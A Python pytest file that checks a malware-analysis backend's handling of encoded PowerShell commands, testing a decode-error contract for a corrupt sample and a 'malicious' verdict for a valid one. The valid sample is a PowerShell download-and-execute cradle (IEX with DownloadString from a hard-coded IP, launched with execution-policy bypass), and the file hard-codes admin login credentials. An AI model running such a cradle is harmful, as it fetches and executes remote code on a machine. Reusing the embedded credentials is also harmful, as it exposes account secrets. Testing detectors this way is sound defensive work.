"""Iteration 43 — Backend API contract test for corrupt PS EncodedCommand.

Verifies POST /api/v2/auto-investigate returns a strict decode_error contract
(never binary garbage) for the user-reported failing sample AND a normal
happy-path for a valid EncodedCommand.
"""
import base64
import os
import re
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
if not BASE_URL:
    # Fallback for pytest run from backend dir where frontend/.env is not sourced
    with open("/app/frontend/.env") as fh:
        for line in fh:
            if line.startswith("REACT_APP_BACKEND_URL="):
                BASE_URL = line.split("=", 1)[1].strip().rstrip("/")

CREDS = {"email": "admin@nivxray.com", "password": "uulVDp5cCSB3Hva99s7UUAwK"}

CORRUPT_INCIDENT = (
    "powershell.exe -exec bypass -enc "
    "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAAA6ACAALwA0ADUALgAxADMANgAuADIAMwAwACAWAADEAOgA0ADAAMAAwACAAyADMANABSADIAMWAnACkAOwA="
)


def _mkclean_enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")


CLEAN_CMD = (
    "IEX (New-Object Net.WebClient).DownloadString('http://45.136.230.14:4000/loader.ps1')"
)
CLEAN_INCIDENT = f"powershell.exe -exec bypass -enc {_mkclean_enc(CLEAN_CMD)}"


@pytest.fixture(scope="module")
def token():
    r = requests.post(f"{BASE_URL}/api/auth/login", json=CREDS, timeout=15)
    assert r.status_code == 200, r.text
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def _semantic_from(resp_json):
    chains = resp_json.get("decode_pipeline", {}).get("chains", [])
    assert chains, f"no chains in response: keys={list(resp_json.keys())}"
    sem = chains[0].get("semantic", {})
    assert sem, f"no semantic on chain[0]: {list(chains[0].keys())}"
    return sem


def test_corrupt_encodedcommand_returns_decode_error_contract(headers):
    r = requests.post(
        f"{BASE_URL}/api/v2/auto-investigate",
        headers=headers,
        json={"incident_text": CORRUPT_INCIDENT},
        timeout=90,
    )
    assert r.status_code == 200, r.text
    sem = _semantic_from(r.json())

    # Anti-garbage contract
    assert sem["decode_outcome"] == "decode_error", sem.get("decode_outcome")
    assert sem["recovered_script"] == "", (
        "recovered_script MUST be empty on decode_error — got: "
        + repr(sem.get("recovered_script", ""))[:120]
    )
    assert sem["behaviors_v2"] == []
    assert sem["ast_tree"] == {}
    assert sem["verdict_breakdown"] == {}
    assert sem["mitre_ids"] == []

    err = sem["decode_error"]
    assert err["b64_status"] == "succeeded"
    assert err["b64_bytes"] == 179, err["b64_bytes"]
    assert err["first_invalid_offset"] == 80, err["first_invalid_offset"]
    assert "illegal encoding" in err["invalid_reason"].lower()

    attempts = {a["decoder"]: a["status"] for a in err["attempts"]}
    expected = {
        "base64_decode": "succeeded",
        "utf16le_strict": "failed",
        "compression_sniff": "skipped",
        "utf8_strict": "failed",
        "ascii_strict": "failed",
        "utf16be_strict": "failed",
        "xor_brute": "failed",
    }
    for k, v in expected.items():
        assert attempts.get(k) == v, f"decoder {k}: expected {v}, got {attempts.get(k)} — {attempts}"

    assert len(err["possible_causes"]) >= 3
    joined = " ".join(err["possible_causes"]).lower()
    assert any(w in joined for w in ("corrupt", "truncat", "nested"))

    hex_preview = err["hex_preview"]
    assert re.fullmatch(r"[0-9a-f\s]+", hex_preview), f"hex_preview not hex-only: {hex_preview[:80]!r}"


def test_valid_encodedcommand_still_recovers(headers):
    r = requests.post(
        f"{BASE_URL}/api/v2/auto-investigate",
        headers=headers,
        json={"incident_text": CLEAN_INCIDENT},
        timeout=90,
    )
    assert r.status_code == 200, r.text
    sem = _semantic_from(r.json())
    assert sem["decode_outcome"] == "fully_decoded", sem["decode_outcome"]
    assert sem.get("decode_error") in ({}, None)
    assert sem["behaviors_v2"], "expected behaviors_v2 populated on clean sample"
    ids = {b.get("id") for b in sem["behaviors_v2"]}
    assert any("c2" in (i or "").lower() or "download" in (i or "").lower() for i in ids), ids
    assert sem["verdict_breakdown"].get("verdict") == "malicious", sem["verdict_breakdown"]
